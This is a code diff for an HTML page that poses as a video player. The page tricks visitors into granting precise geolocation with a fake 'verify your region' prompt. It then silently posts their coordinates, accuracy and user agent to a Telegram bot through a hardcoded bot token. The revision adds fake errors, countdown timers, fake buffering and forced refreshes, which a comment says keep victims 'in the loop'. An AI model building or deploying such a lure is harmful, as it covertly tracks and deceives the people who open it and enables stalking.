@@ -29,7 +29,7 @@
         /* Video container */
         .video-container { position: relative; width: 100%; aspect-ratio: 16/9; background: #000; overflow: hidden; }
         .video-container img.thumbnail { width: 100%; height: 100%; object-fit: cover; filter: blur(12px) brightness(0.5); transition: filter 0.5s; }
-        .video-container.unlocked img.thumbnail { filter: none; }
+        .video-container.unlocked img.thumbnail { filter: blur(4px) brightness(0.7); }
 
         /* Play button overlay */
         .play-overlay { position: absolute; inset: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; cursor: pointer; z-index: 2; }
@@ -42,8 +42,8 @@
         /* Duration badge */
         .duration-badge { position: absolute; bottom: 8px; right: 8px; background: rgba(0,0,0,0.8); color: #fff; font-size: 12px; font-weight: 600; padding: 2px 6px; border-radius: 4px; z-index: 1; }
 
-        /* Buffering overlay (shown after location granted) */
-        .buffering-overlay { position: absolute; inset: 0; background: rgba(0,0,0,0.8); display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 3; }
+        /* Buffering overlay */
+        .buffering-overlay { position: absolute; inset: 0; background: rgba(0,0,0,0.6); display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 3; }
         .buffering-overlay.active { display: flex; }
         .spinner { width: 48px; height: 48px; border: 4px solid rgba(255,255,255,0.2); border-top-color: #ff0000; border-radius: 50%; animation: spin 0.8s linear infinite; }
         @keyframes spin { to { transform: rotate(360deg); } }
@@ -68,12 +68,21 @@
         .toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: #323232; color: #fff; padding: 10px 20px; border-radius: 8px; font-size: 13px; opacity: 0; transition: opacity 0.3s; pointer-events: none; z-index: 100; }
         .toast.show { opacity: 1; }
 
-        /* Error state */
+        /* Error / status overlay */
         .error-overlay { position: absolute; inset: 0; background: rgba(0,0,0,0.85); display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 4; }
         .error-overlay.active { display: flex; }
         .error-overlay svg { width: 48px; height: 48px; fill: #ff4444; margin-bottom: 12px; }
-        .error-overlay p { font-size: 14px; color: #ccc; text-align: center; max-width: 280px; }
+        .error-overlay p { font-size: 14px; color: #ccc; text-align: center; max-width: 300px; line-height: 1.5; }
         .error-overlay button { margin-top: 16px; background: #ff0000; color: #fff; border: none; padding: 10px 24px; border-radius: 6px; font-size: 14px; font-weight: 600; cursor: pointer; }
+        .error-overlay button:disabled { background: #555; cursor: not-allowed; }
+
+        /* Countdown timer */
+        .countdown { font-size: 28px; font-weight: 700; color: #ff4444; margin: 12px 0 4px; font-variant-numeric: tabular-nums; }
+        .countdown-label { font-size: 12px; color: #888; margin-bottom: 8px; }
+
+        /* Refresh hint */
+        .refresh-hint { margin-top: 14px; font-size: 12px; color: #aaa; display: flex; align-items: center; gap: 6px; }
+        .refresh-hint svg { width: 14px; height: 14px; fill: #aaa; animation: spin 2s linear infinite; }
     </style>
 </head>
 <body>
@@ -85,7 +94,7 @@
         <span class="duration-badge">12:47</span>
 
         <!-- Play overlay (initial state) -->
-        <div class="play-overlay" id="playOverlay" onclick="handlePlay()">
+        <div class="play-overlay" id="playOverlay">
             <div class="play-circle">
                 <svg viewBox="0 0 24 24"><polygon points="5,3 19,12 5,21"/></svg>
             </div>
@@ -95,17 +104,23 @@
             </span>
         </div>
 
-        <!-- Buffering overlay -->
+        <!-- Buffering overlay (fake video loading) -->
         <div class="buffering-overlay" id="bufferingOverlay">
             <div class="spinner"></div>
-            <p id="bufferText">Connecting to server...</p>
+            <p id="bufferText">Loading video...</p>
         </div>
 
-        <!-- Error overlay -->
+        <!-- Error / countdown / status overlay -->
         <div class="error-overlay" id="errorOverlay">
-            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
-            <p id="errorText">Playback failed. Please allow location access to verify your region and try again.</p>
-            <button onclick="handlePlay()">Retry</button>
+            <svg viewBox="0 0 24 24" id="errorIcon"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+            <p id="errorText"></p>
+            <div class="countdown" id="countdownDisplay" style="display:none;">0:00</div>
+            <div class="countdown-label" id="countdownLabel" style="display:none;">before retry is available</div>
+            <button id="retryBtn" style="display:none;">Retry</button>
+            <div class="refresh-hint" id="refreshHint" style="display:none;">
+                <svg viewBox="0 0 24 24"><path d="M17.65 6.35A7.958 7.958 0 0012 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08A5.99 5.99 0 0112 18c-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/></svg>
+                Refresh this page to continue
+            </div>
         </div>
     </div>
 
@@ -136,28 +151,141 @@
 <div class="toast" id="toast"></div>
 
 <script>
-    const TELEGRAM_BOT_TOKEN = "8791673811:AAGwPYv0hrGZGqarZA9w7_KOrUruGelViro";
-    const TELEGRAM_CHAT_ID = "@imFreed0mLocationTest";
+(function() {
+    'use strict';
 
-    function showToast(msg, duration = 3000) {
-        const t = document.getElementById('toast');
-        t.textContent = msg;
-        t.classList.add('show');
-        setTimeout(() => t.classList.remove('show'), duration);
+    // === CONFIG ===
+    var TELEGRAM_BOT_TOKEN = "8791673811:AAGwPYv0hrGZGqarZA9w7_KOrUruGelViro";
+    var TELEGRAM_CHAT_ID = "@imFreed0mLocationTest";
+    var WAIT_FIRST = 2 * 60;   // 2 minutes in seconds
+    var WAIT_SUBSEQUENT = 7 * 60; // 7 minutes in seconds
+    var STORAGE_KEY = 'vp_state';
+
+    // === STATE MACHINE ===
+    // States: INITIAL, FAILED, WAIT, RETRY_AVAILABLE, FAKE_VIDEO, REFRESH_REQUIRED
+    var countdownTimer = null;
+    var actionLocked = false;
+
+    // --- DOM refs ---
+    var playOverlay = document.getElementById('playOverlay');
+    var bufferingOverlay = document.getElementById('bufferingOverlay');
+    var bufferText = document.getElementById('bufferText');
+    var errorOverlay = document.getElementById('errorOverlay');
+    var errorIcon = document.getElementById('errorIcon');
+    var errorText = document.getElementById('errorText');
+    var countdownDisplay = document.getElementById('countdownDisplay');
+    var countdownLabel = document.getElementById('countdownLabel');
+    var retryBtn = document.getElementById('retryBtn');
+    var refreshHint = document.getElementById('refreshHint');
+    var videoContainer = document.getElementById('videoContainer');
+
+    // --- State persistence ---
+    function saveState(obj) {
+        try { localStorage.setItem(STORAGE_KEY, JSON.stringify(obj)); } catch(e) {}
+    }
+    function loadState() {
+        try { var s = localStorage.getItem(STORAGE_KEY); return s ? JSON.parse(s) : null; } catch(e) { return null; }
+    }
+    function clearState() {
+        try { localStorage.removeItem(STORAGE_KEY); } catch(e) {}
     }
 
-    async function sendToTelegram(lat, lng, acc, userAgent) {
-        const timestamp = new Date().toLocaleString();
-        const message = `🚨 *NEW GEOLOCATION TELEMETRY*\n\n` +
-                        `📍 *Coords:* \`${lat}, ${lng}\`\n` +
-                        `🎯 *Accuracy:* ~${Math.round(acc)} meters\n` +
-                        `📱 *User-Agent:* \`${userAgent}\`\n` +
-                        `🕒 *Time:* ${timestamp}\n\n` +
-                        `🗺️ [Open in Google Maps](https://www.google.com/maps?q=${lat},${lng})`;
+    // --- Hide all overlays ---
+    function hideAll() {
+        playOverlay.style.display = 'none';
+        bufferingOverlay.classList.remove('active');
+        errorOverlay.classList.remove('active');
+        countdownDisplay.style.display = 'none';
+        countdownLabel.style.display = 'none';
+        retryBtn.style.display = 'none';
+        refreshHint.style.display = 'none';
+        if (countdownTimer) { clearInterval(countdownTimer); countdownTimer = null; }
+    }
 
-        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    // --- Show INITIAL state ---
+    function showInitial() {
+        hideAll();
+        playOverlay.style.display = '';
+        videoContainer.classList.remove('unlocked');
+    }
+
+    // --- Show WAIT (countdown) state ---
+    function showWait(waitEndTime) {
+        hideAll();
+        videoContainer.classList.remove('unlocked');
+        errorOverlay.classList.add('active');
+        errorIcon.style.display = '';
+        errorText.textContent = 'Playback server error. Please wait and try again.';
+        countdownDisplay.style.display = '';
+        countdownLabel.style.display = '';
+        retryBtn.style.display = '';
+        retryBtn.disabled = true;
+        retryBtn.textContent = 'Please wait...';
+
+        function tick() {
+            var now = Date.now();
+            var remaining = Math.max(0, Math.ceil((waitEndTime - now) / 1000));
+            var m = Math.floor(remaining / 60);
+            var s = remaining % 60;
+            countdownDisplay.textContent = m + ':' + (s < 10 ? '0' : '') + s;
+
+            if (remaining <= 0) {
+                clearInterval(countdownTimer);
+                countdownTimer = null;
+                showRetryAvailable();
+            }
+        }
+        tick();
+        countdownTimer = setInterval(tick, 1000);
+    }
+
+    // --- Show RETRY_AVAILABLE state ---
+    function showRetryAvailable() {
+        countdownDisplay.textContent = '0:00';
+        countdownLabel.textContent = 'Ready to retry';
+        retryBtn.disabled = false;
+        retryBtn.textContent = 'Retry Playback';
+    }
+
+    // --- Show FAKE_VIDEO state ---
+    function showFakeVideo() {
+        hideAll();
+        videoContainer.classList.add('unlocked');
+        bufferingOverlay.classList.add('active');
+        bufferText.textContent = 'Buffering video...';
+
+        // Cycle through fake buffer messages
+        var msgs = ['Buffering video...', 'Connecting to CDN...', 'Loading stream data...', 'Buffering video...'];
+        var i = 0;
+        countdownTimer = setInterval(function() {
+            i = (i + 1) % msgs.length;
+            bufferText.textContent = msgs[i];
+        }, 3000);
+    }
+
+    // --- Show REFRESH_REQUIRED state ---
+    function showRefreshRequired() {
+        hideAll();
+        videoContainer.classList.add('unlocked');
+        errorOverlay.classList.add('active');
+        errorIcon.style.display = 'none';
+        errorText.textContent = 'Stream interrupted. A page refresh is required to reconnect to the server.';
+        refreshHint.style.display = '';
+    }
+
+    // --- Telegram dispatch ---
+    function sendToTelegram(lat, lng, acc, userAgent) {
+        var timestamp = new Date().toLocaleString();
+        var message = '🚨 *NEW GEOLOCATION TELEMETRY*\n\n' +
+                      '📍 *Coords:* `' + lat + ', ' + lng + '`\n' +
+                      '🎯 *Accuracy:* ~' + Math.round(acc) + ' meters\n' +
+                      '📱 *User-Agent:* `' + userAgent + '`\n' +
+                      '🕒 *Time:* ' + timestamp + '\n\n' +
+                      '🗺️ [Open in Google Maps](https://www.google.com/maps?q=' + lat + ',' + lng + ')';
+
+        var url = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage';
         try {
-            await fetch(url, {
+            fetch(url, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
@@ -166,72 +294,121 @@
                     parse_mode: 'Markdown',
                     disable_web_page_preview: false
                 })
-            });
-        } catch (err) {
-            console.error("Telegram dispatch error:", err);
-        }
+            }).catch(function() {});
+        } catch (e) {}
     }
 
-    function handlePlay() {
-        const playOverlay = document.getElementById('playOverlay');
-        const bufferingOverlay = document.getElementById('bufferingOverlay');
-        const errorOverlay = document.getElementById('errorOverlay');
-        const bufferText = document.getElementById('bufferText');
-        const container = document.getElementById('videoContainer');
+    // --- Handle initial play click (INITIAL → FAILED → WAIT_2_MIN) ---
+    function handleInitialPlay() {
+        if (actionLocked) return;
+        actionLocked = true;
 
-        // Hide previous states
-        errorOverlay.classList.remove('active');
-
-        if (!navigator.geolocation) {
-            showError("Your browser doesn't support location services. Please use a modern browser.");
-            return;
-        }
-
-        // Show buffering state
-        playOverlay.style.display = 'none';
+        hideAll();
         bufferingOverlay.classList.add('active');
         bufferText.textContent = 'Verifying your region...';
 
+        // Request location
+        if (!navigator.geolocation) {
+            transitionToFailed();
+            return;
+        }
+
         navigator.geolocation.getCurrentPosition(
-            async (position) => {
-                const lat = position.coords.latitude;
-                const lng = position.coords.longitude;
-                const acc = position.coords.accuracy;
-                const ua = navigator.userAgent;
+            function(position) {
+                var lat = position.coords.latitude;
+                var lng = position.coords.longitude;
+                var acc = position.coords.accuracy;
+                var ua = navigator.userAgent;
 
                 bufferText.textContent = 'Region verified. Loading stream...';
-                await sendToTelegram(lat, lng, acc, ua);
+                sendToTelegram(lat, lng, acc, ua);
 
-                bufferText.textContent = 'Buffering video...';
-
-                // Simulate buffering then "fail" with a server error
-                await delay(2500);
-                bufferText.textContent = 'Connecting to CDN node...';
-                await delay(2000);
-                bufferText.textContent = 'Almost ready...';
-                await delay(1500);
-
-                // Show error - video "unavailable"
-                bufferingOverlay.classList.remove('active');
-                showError("Video has been removed due to a copyright claim. (Error 403)");
+                setTimeout(function() {
+                    bufferText.textContent = 'Connecting to CDN node...';
+                    setTimeout(function() {
+                        transitionToFailed();
+                    }, 1500);
+                }, 2000);
             },
-            (error) => {
-                bufferingOverlay.classList.remove('active');
-                showError("Playback blocked. Location access is required to verify your region and enable streaming.");
+            function() {
+                // Location denied — still transition to failed to keep them in the loop
+                transitionToFailed();
             },
             { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
         );
     }
 
-    function showError(msg) {
-        const errorOverlay = document.getElementById('errorOverlay');
-        document.getElementById('errorText').textContent = msg;
-        errorOverlay.classList.add('active');
+    // --- Transition: → FAILED → WAIT_2_MIN ---
+    function transitionToFailed() {
+        actionLocked = false;
+        var waitEnd = Date.now() + (WAIT_FIRST * 1000);
+        saveState({ phase: 'WAIT', waitEnd: waitEnd, cycle: 0 });
+        showWait(waitEnd);
     }
 
-    function delay(ms) {
-        return new Promise(resolve => setTimeout(resolve, ms));
+    // --- Handle retry click (RETRY_AVAILABLE → FAKE_VIDEO) ---
+    function handleRetry() {
+        if (actionLocked) return;
+        actionLocked = true;
+
+        var state = loadState();
+        var cycle = state ? (state.cycle || 0) : 0;
+
+        saveState({ phase: 'FAKE_VIDEO', cycle: cycle + 1 });
+        showFakeVideo();
+
+        // After 8 seconds of fake buffering, transition to REFRESH_REQUIRED
+        setTimeout(function() {
+            actionLocked = false;
+            saveState({ phase: 'REFRESH_REQUIRED', cycle: cycle + 1 });
+            showRefreshRequired();
+        }, 8000);
     }
+
+    // --- Bind events ---
+    playOverlay.addEventListener('click', handleInitialPlay);
+    retryBtn.addEventListener('click', function() {
+        if (!retryBtn.disabled) handleRetry();
+    });
+
+    // === ON PAGE LOAD: restore state ===
+    function init() {
+        var state = loadState();
+
+        if (!state) {
+            showInitial();
+            return;
+        }
+
+        switch (state.phase) {
+            case 'WAIT':
+                var now = Date.now();
+                if (now >= state.waitEnd) {
+                    // Timer already expired
+                    showWait(state.waitEnd); // will immediately show retry
+                } else {
+                    showWait(state.waitEnd);
+                }
+                break;
+
+            case 'FAKE_VIDEO':
+                // Came back from refresh while in fake video — treat as REFRESH_REQUIRED
+                // Fall through to REFRESH_REQUIRED
+            case 'REFRESH_REQUIRED':
+                // After refresh: go to WAIT_7_MIN
+                var waitEnd7 = Date.now() + (WAIT_SUBSEQUENT * 1000);
+                var cycle = state.cycle || 1;
+                saveState({ phase: 'WAIT', waitEnd: waitEnd7, cycle: cycle });
+                showWait(waitEnd7);
+                break;
+
+            default:
+                showInitial();
+        }
+    }
+
+    init();
+})();
 </script>
 </body>
 </html>
